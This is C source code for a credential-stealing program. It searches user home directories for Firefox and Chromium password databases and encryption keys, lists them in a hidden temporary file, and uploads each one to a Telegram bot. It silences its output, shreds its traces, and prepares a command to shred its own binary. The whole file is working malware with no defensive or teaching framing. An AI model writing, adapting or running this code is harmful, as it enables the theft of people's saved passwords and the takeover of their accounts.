#include <stdio.h>
#include <curl/curl.h>
#include <stdlib.h>
#include <string.h>

CURL *curl;
curl_mime *mime;
char *chat_id = "<CHAT_ID OF THE USER OF THE BOT TO SEND THE DUMPS TO>";
char *token = "<YOUR TELEGRAM BOT TOKEN>";

void dumper(char *file){
    curl_mimepart *dump = curl_mime_addpart(mime);
    curl_mime_name(dump,"document");
    curl_mime_filedata(dump,file);

    curl_mimepart *to = curl_mime_addpart(mime);
    curl_mime_name(to,"chat_id");
    curl_mime_data(to,chat_id,11);

    curl_mimepart *dumped = curl_mime_addpart(mime);
    curl_mime_name(dumped,"caption");
    curl_mime_data(dumped,file,strlen(file));

    curl_easy_setopt(curl,CURLOPT_URL,token);
    curl_easy_setopt(curl,CURLOPT_MIMEPOST,mime);
    
    curl_easy_perform(curl);
    curl_mime_free(mime);
    mime = curl_mime_init(curl);
}

int main(int argc, char *argv[]){
    curl = curl_easy_init();
    mime = curl_mime_init(curl);

    freopen("/dev/null","w",stdout);

    system("shred -zu /tmp/.lll 2>/dev/null");
    system("find /home -name logins.json -type f 2>/dev/null >> /tmp/.lll");
    system("find /home -name key4.db -type f 2>/dev/null >> /tmp/.lll");
    system("find /home -name 'Login Data' -type f 2>/dev/null >> /tmp/.lll");
    system("find /home -name 'Local State' -type f 2>/dev/null >> /tmp/.lll");

    FILE *file = fopen("/tmp/.lll","r");
    if (file == NULL){
        return 1;
    }
    size_t sz;
    char *path;
    while (getline(&path,&sz,file) != -1){
        path[strlen(path)-1] = '\0';
        dumper(path);
    }

    fclose(file);
    curl_easy_cleanup(curl);
    char del[56+strlen(argv[0])];
    snprintf(del,sizeof(del),"shred -zu /tmp/.lll 2>/dev/null ; 2>/dev/null shred -zu %s",argv[0]);
    return 0;
}